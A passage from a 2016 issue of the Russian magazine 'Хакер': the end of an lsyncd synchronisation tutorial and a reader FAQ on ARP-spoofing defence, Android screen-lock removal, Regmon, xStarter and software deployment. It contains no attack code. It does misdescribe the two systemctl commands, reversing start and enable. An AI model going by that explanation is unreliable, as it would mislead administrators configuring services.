Аналогично с сервера second добавь ключ на сервер first:

# ssh-copy-id root@first.example.com

Теперь подключись с сервера first к серверу second и наоборот. Пароль за-
прашиваться не будет. На вопросы при подключении отвечай yes.
   Вот теперь на сервере first создай тестовый файл:

# touch /var/www/html/test

Далее запусти lsyncd вручную:

# lsyncd /etc/lsyncd.conf

Проверь, что все синхронизировалось корректно. Если все прошло хорошо,
то на втором сервере в /var/www/html ты увидишь созданный файл test.
   Осталось изменить значение nodaemon в конфиге на false и добавить
lsyncd в автозагрузку:

systemctl start lsyncd.service
systemctl enable lsyncd.service

Первая команда включает автозагрузку сервиса, а вторая запускает сам сервис.

Примечания
Наша схема синхронизации работает в одном направлении. При желании
можно сделать и двухстороннюю синхронизацию (SSH уже настроен, осталось
настроить lsyncd), но она нужна далеко не всегда.
   Обычно имеется одно хранилище контента (первый сервер) и каждые 5–10
с выполняется репликация со вторым сервером. Если сервер обновляется
не очень часто, можно вообще производить синхронизацию вручную, после
его обновления, или же установить интервал не в пять секунд, а в 3600 (син-
хронизация один раз в час). В данном примере пять секунд использовались,
чтобы меньше ждать при тестировании.
   Собственно, на этом все! Отказоустойчивость настроена, синхронизация
(хоть и частичная, без репликации БД) — тоже.
FAQ



                                        Алексей Zemond
                                            Панкратов
                                           3em0nd@gmail.com

FAQ
      ответы на вопросы
          читателей

                    (есть вопросы? шли на FAQ@GLC.RU)





КАК ЗАЩИТИТЬ ЛОКАЛЬНУЮ СЕТЬ ОТ ARP-СПУФИНГА
Если хакер запустит снифер (к примеру, Wireshark) в локальной сети, то ничего
интересного он не увидит, кроме своих бродкастов и прочей служебной ин-
формации. Поэтому для перехвата трафика обычно используются слабости
самого протокола ARP. Разберемся, как можно компенсировать их.





                                                    ARP spoofing attack


Протокол ARP используется для преобразования IP-адреса в MAC-адрес.
Исторически ARP не имеет никакой защиты или хотя бы проверки подлинности
запросов. Повторю: совсем никакой! А еще возможна отправка ARP-ответов
без ARP-запросов — это так называемый gratuitous ARP. Он-то нас и интере-
сует. Чтобы провернуть подобную схему, можно воспользоваться тулзой Cain
& Abel. Думаю, ты о ней знаешь.
  С помощью Cain & Abel злоумышленник может вклиниться и перехватить
трафик в одном широковещательном домене. Защититься от этой напасти
можно при помощи механизма Dynamic ARP Inspection (Protection).
   Для корректной работы Dynamic ARP Inspection необходимо указывать, ка-
кие порты коммутатора будут доверенными, а какие — нет. Под ненадежным
портом подразумевается тот порт, к которому подключены клиенты. Для не-
надежных портов выполняется ряд проверок сообщений ARP. А к доверенным
портам коммутатора относятся те порты, к которым подключен другой комму-
татор. Сообщения протокола ARP, полученные с доверенных портов, не от-
брасываются.
   Коммутатор перехватывает все ARP-запросы и ARP-ответы на ненадежных
портах, прежде чем перенаправлять их. Также на ненадежных портах коммута-
тор проверяет соответствие MAC-адреса IP-адресу.
   Проверка соответствия MAC-адреса IP-адресу может выполняться на ос-
новании статических записей или базы данных привязки DHCP.
  На коммутаторах Cisco этот механизм во VLAN включается командой

Switch(config)# ip arp inspection vlan 1

А вот как выглядит настройка доверенного порта:

Switch(config)# interface gigabitethernet1/0/1
Switch(config-if)# ip arp inspection trust

   Если у тебя нет коммутатора, способного защитить от атак подобного типа,
можешь установить arpwatch (ссылка на файл). Это демон, который отслежи-
вает соответствие между IP- и MAC-адресами и при обнаружении аномалий
фиксирует это в системном логе. Документацию можно глянуть вот здесь.
   Как сам понимаешь, главный недостаток arpwatch, как и, в принципе, всех
программ подобного рода, в том, что он должен работать на хостах, которые
он защищает, или хотя бы на маршрутизаторе, ведущем в защищаемую сеть.
Однако маршрутизатор не всегда работает под управлением UNIX или Linux.
Чаще всего это специализированный аппаратный маршрутизатор или комму-
татор третьего уровня.
   Чтобы защитить такой маршрутизатор, нужно получать от него ARP-табли-
цу по SNMP и анализировать ее на другой машине. Так, к примеру, действует
программа remarp.

ШЕСТЬ ШАГОВ, КОТОРЫЕ ПОЗВОЛЯТ СНЯТЬ БЛОКИРОВКУ
ЭКРАНА НА ANDROID
Иногда выключить функцию блокировки экрана на Android оказывается нелег-
ко: соответствующий пункт меню может быть просто неактивен. При этом теле-
фон позволяет установить другое приложение для блокировки, но выключить
ее совсем не дает. Если ты столкнулся с этой проблемой и убирать блокировку
действительно есть смысл, то вот как этого добиться.
1. Первым делом глянь, не стоит ли у тебя шифрование устройства или карты
   памяти. Как сам понимаешь, для снятия блокировки меню устройство нужно
   расшифровать.
2. Проверить, нет ли установленного соединения VPN. Одно из условий его
   работы как раз установка защиты экрана устройства. Для устранения про-
  блемы сеть VPN придется удалить.
3. Заглянуть в меню «Безопасность   Администраторы устройства» и убрать
   всех, кто там засел. Кстати, приложения, попавшие в этот список, просто
   так удалить тоже не выйдет. Сначала нужно снять галку, а уже потом удалять
   приложение. Так же и с блокировкой экрана: снимай галки и пробуй убрать
   защиту экрана.
4. При установке корпоративной почты она автоматом попадает в администра-
   торы устройства и требует защиты экрана. Лечится снятием галки и удале-
  нием всех подобных приложений.
5. Если такая функциональность предусмотрена производителем, то мож-
   но запуститься в безопасном режиме и посмотреть, есть ли возможность
   убрать блокировку экрана. Если меню доступно, значит, одно из приложений
   продолжает мешать. Программу нужно найти и удалить. Безопасный режим
   отличается от обычного тем, что запускает телефон без приложений. Акти-
   вируется он по-разному в устройствах разных производителей. К примеру,
   в аппаратах Samsung при появлении логотипа во время загрузки нужно на-
   жать кнопку уменьшения громкости и держать до полного запуска. Внизу бу-
   дет отображено сообщение о входе в безопасный режим. Если у тебя труб-
   ка другой марки, поищи инструкцию в руководстве пользователя.
6. Если ничего не помогло, то остается только одно — сброс и восстановле-
   ние заводских настроек. Последствия, конечно, могут быть тяжкими, но это,
   увы, один из самых действенных и безотказных способов.

ВЫНОСИМ МФУ В ОТДЕЛЬНУЮ ПОДСЕТЬ И УЧИМСЯ ИСПОЛЬ-
ЗОВАТЬ REGMON ДЛЯ ОТСЛЕЖИВАНИЯ РЕЕСТРА WINDOWS
Обычная ситуация: в офис купили новенькое МФУ, подключили его к сети,
и оно трудится на благо человечества. Но со временем захотелось перенести
его в отдельную подсеть. Задача вроде бы тривиальная: меняем адрес у прин-
тера, и готово. Но не тут-то было! Принтер будет печатать, как и прежде, а вот
сканер при этом работать перестает. Что ж, заглянем в логи Windows 8, чтобы
узнать, что пошло не так.
   Параметры отдельных приложений разбросаны по реестру так, что найти
их не очень-то просто. Интересующие нас настройки сканера хранятся по сле-
дующим путям:

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Class\
    {6BDD1FC6-810F-11D0-BEC7-08002BE2092F}
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\Root\IMAGE

  Нас интересует параметр PortID, его нужно править на необходимый. Эту
ветку можно попробовать найти поиском, введя используемый адрес. Способ
нормальный, но иногда поиск не спасает. В таких ситуациях на выручку прихо-
дит утилита Regmon.





                                                              Regmon

При помощи Regmon можно отследить, к каким ключам реестра обращается
процесс. Для этого после запуска тулзы нажми Crtl + L и в открывшемся окне
вводи в поле Include имя файла. Затем в меню Edit выбери пункт Clear Display
(это нужно для того, чтобы не рыться потом в дебрях ключей). Теперь запуска-
ем нашу программу и смотрим, куда она обращается. Ну а в случае с МФУ есть
еще один действенный способ: просто переустановить драйверы (причем луч-
ше сначала снести их, а потом поставить заново).

КАК НАУЧИТЬ НАСТОЛЬНЫЙ КОМПЬЮТЕР САМОСТОЯТЕЛЬ-
НО ВКЛЮЧАТЬСЯ И ВЫПОЛНЯТЬ ЗАДАЧИ ПРИ ПОМОЩИ
XSTARTER
Если ты любишь все автоматизировать и представлять себе, что живешь в ки-
берпанковском будущем, то тебя наверняка заинтересует возможность нау-
чить компьютер самостоятельно включаться утром, открывать новостные сай-
ты, врубать музыку и делать прочие полезные вещи.
   Включить комп можно всего несколькими способами. Первый из них — че-
рез BIOS. Второй — через софт, но именно включить таким образом не по-
лучится, только вывести из сна (по факту он все равно будет включен). Если
ты так и так не выключаешь машину на ночь, то это не проблема. А вот если
не хочешь, чтобы компьютер шумел и тратил электричество, то автоматически
включаться он сможет, только если матплата поддерживает такую функцию.
Проверить это просто: нужно зайти в CMOS Setup и поискать там параметр
Power Management Setup. Внутри должен быть параметр Power-On by Alarm,
которому мы присвоим значение Enabled и тем самым разрешим включать
компьютер по расписанию. Обычно после выставления этого пункта становят-
ся доступны пункты с тонкой настройкой времени включения.





                                                                         BIOS

После сохранения значений компьютер будет включаться самостоятельно.
А для настройки выключения по расписанию и запуска программ есть уже
масса вариантов. Если совсем не заморачиваться, то можно воспользовать-
ся стандартным планировщиком задач Windows и написать какой-нибудь bat.
Но я бы предложил вместо этого использовать xStarter, это очень легковесная
программка, в которой можно настроить кучу всего.





                                                                                  xStarter



Здесь можно писать свои макросы, причем даже со сложной логикой и ис-
пользованием условных переходов, выбирать различные действия из уже го-
товых шаблонов и многое другое. Применение этой программе можно найти
как на домашнем компьютере, так и на рабочем. Среди возможностей xStarter:
•  выполнение файловых операций;
•  расширенный планировщик задач;
•  обеспечение сохранности данных;
•  отслеживание изменений файлов и каталогов;
•  создание и запуск макросов Windows;
•  синхронизация каталогов;
•  работа с электронной почтой, файлами по FTP и HTTP;
•  ну и конечно, запуск программ по расписанию.

Как видишь, не так уж и сложно организовать автоматику. А пользы — уйма.

ВЫБИРАЕМ СРЕДСТВО РАЗВЕРТЫВАНИЯ ПО В КОРПОРАТИВ-
НЫХ СЕТЯХ
При развертывании программного обеспечения всегда стоишь перед выбо-
ром. Или упростить схему, но больше бегать, или же усложнить, но сократить
время на рутинную работу. К сожалению, окончательного решения нет, но есть
интересные.
  С обновлениями, предположим, все ясно. Ставим WSUS и настраиваем,
какие обновления делать, а какие нет. Ну и мониторим пользователей: у кого
давно ничего не обновлялось, у кого пропала связь с сервером обновления.
Впрочем, бывают ситуации, когда нужно обновлять нестандартное ПО. Тогда
на помощь приходит программа SCCM Shavlik, которая работает совместно
с SCCM. Главный ее недостаток — это цена (порядка 50 долларов за одну ма-
шину в год). Не каждая компания готова столько тратить ради удобства адми-
нистратора.
  В качестве альтернативы можно, конечно, использовать GPO, но тут встает
вопрос удобства. Каждую программу придется преобразовать в *.msi с помо-
щью одного из приложений независимых поставщиков, к примеру WinINSTALL,
InstallShield или же Wise for Windows Installer.
   Хорошо, если речь идет о каком-то одном пакетном установщике, а как быть
с монстрами масштаба Microsoft Office? Тут так просто уже не отделаться, со-
здание пакета займет время. Плюс настройка и обкатка политик — тоже за-
тратное дело и не всегда на выходе дает то, что планировал в самом начале.
   У некоторых специфичных программ (банковские клиенты, например, или
генераторы отчетов) свои особенности, причем иногда такие, что после оз-
накомления с ними админы начинают вздрагивать от одного названия этих
прекрасных софтин. К такому софту нужен особый подход. Можно, к примеру,
взять и запустить программный комплекс по декларациям в качестве сервиса,
указав привилегированного пользователя как владельца службы. Это даст ему
возможность обновляться самостоятельно, без твоего участия. А это, поверь,
очень удобно, потому что обновления будут приходить чуть ли не каждый день.
  Самым лучшим решением, пожалуй, будет совмещение разных методов.
Это и GPO, и скрипты на том же PowerShell, и, конечно же, использование воз-
можностей, встроенных в саму программу. Главное — вовремя прочитать до-
кументацию, а не спешить наломать дров.
                                    18+





  № 11 (214)
                     Илья Русанен            Алексей Глазков
                      Главный редактор         Выпускающий редактор
                          rusanen@glc.ru                  glazkov@glc.ru

                 Андрей Письменный        Евгения Шарипова
                       Шеф-редактор           Литературный редактор
                         pismenny@glc.ru


                       РЕДАКТОРЫ РУБРИК
      Андрей Письменный       Антон «ant» Жуков           Александр «Dr.»
     PC ZONE, СЦЕНА, UNITS          ВЗЛОМ                 Лозовский
          pismenny@glc.ru              zhukov@glc.ru            MALWARE, КОДИНГ,
                                                           PHREAKING
                                                                         lozovsky@glc.ru       Юрий Гольцев           Евгений Зобнин
          ВЗЛОМ                  X-MOBILE
            goltsev@glc.ru                zobnin@glc.ru

        Илья Русанен           Павел Круглов
           КОДИНГ              UNIXOID и SYN/ACK
           rusanen@glc.ru                kruglov@glc.ru


                        MEGANEWS
                             Мария Нефёдова
                                  nefedova.maria@gameland.ru



                                АРТ
                   Анна Королькова          Depositphotos.com
                        Верстальщик             Источник лицензионных
                     цифровой версии             фото и графики


                           РЕКЛАМА
                            Мария Самсоненко
                                Менеджер по рекламе
                                      samsonenko@glc.ru


                 РАСПРОСТРАНЕНИЕ И ПОДПИСКА
                     Подробная информация по подписке: paywall@glc.ru
                                 Отдел распространения
                                Наталья Алехина (lapina@glc.ru)
                          Адрес для писем: Москва, 109147, а/я 50




В случае возникновения вопросов по качеству печати: claim@glc.ru. Адрес редакции: 115280, Москва, ул. Ленинская Слобода, д. 19, Омега плаза. Изда-
тель: ООО «Эрсиа»: 606400, Нижегородская обл., Балахнинский р-н, г. Балахна, Советская пл., д. 13. Учредитель: ООО «Принтер Эдишионс», 614111,
Пермский край, г. Пермь, ул. Яблочкова, д. 26. Зарегистрировано в Федеральной службе по надзору в сфере связи, информационных технологий и массо-
вых коммуникаций (Роскомнадзоре), свидетельство ПИ № ФС77-56756 от 29.01.2014 года. Мнение редакции не обязательно совпадает с мнением авто-
ров. Все материалы в номере предоставляются как информация к размышлению. Лица, использующие данную информацию в противозаконных целях,
могут быть привлечены к ответственности. Редакция не несет ответственности за содержание рекламных объявлений в номере. По вопросам лицензи-
рования и получения прав на использование редакционных материалов журнала обращайтесь по адресу: xakep@glc.ru. © Журнал «Хакер», РФ, 2016